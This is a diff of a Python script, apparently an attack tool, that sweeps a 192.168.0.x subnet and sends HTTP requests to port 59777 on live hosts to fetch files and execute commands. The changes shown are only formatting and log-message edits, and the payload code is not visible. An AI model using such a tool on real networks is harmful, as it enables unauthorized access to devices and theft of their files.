@@ -6,7 +6,8 @@ import sys
 from socket import *
 
 network = '192.168.0.'
-verbose = True 
+verbose = True
+
 
 def sanitize_json(json):
     json = json.replace("\'", "\"")
@@ -16,7 +17,6 @@ def sanitize_json(json):
 
 
 def get_file(addr, filepath):
-     
     if verbose:
         print('[*] Getting file: ' + filepath + '\n\tfrom: ' + addr)
     session = requests.Session()
@@ -36,9 +36,10 @@ def get_file(addr, filepath):
 
 
 def execute_cmd(addr, cmd, package):
-    session = requests.Session()
     if verbose:
-        print('[*] Executing command: ' + cmd + '\n\tPackage: ' + package + '\n\ton:' + addr)
+        print('[*] Executing command: ' + cmd + ' on ' + addr)
+
+    session = requests.Session()
     headers = {"Content-Type": "application/json"}
     address = 'http://' + addr + ':59777'
 
@@ -134,10 +135,12 @@ def main():
         for ip in range(0, 255):
             addr = network + str(ip)
             if verbose:
-              print('[*] Checking address: ' + addr)
+                print('[*] Checking address: ' + addr)
+
             if is_up(addr):
                 if verbose:
-                  print('[+] Address is up: ' + addr)
+                    print('[+] Address is up: ' + addr)
+
                 if options.filepath != '':
                     get_file(addr, options.filepath)
                 elif options.cmd != '':
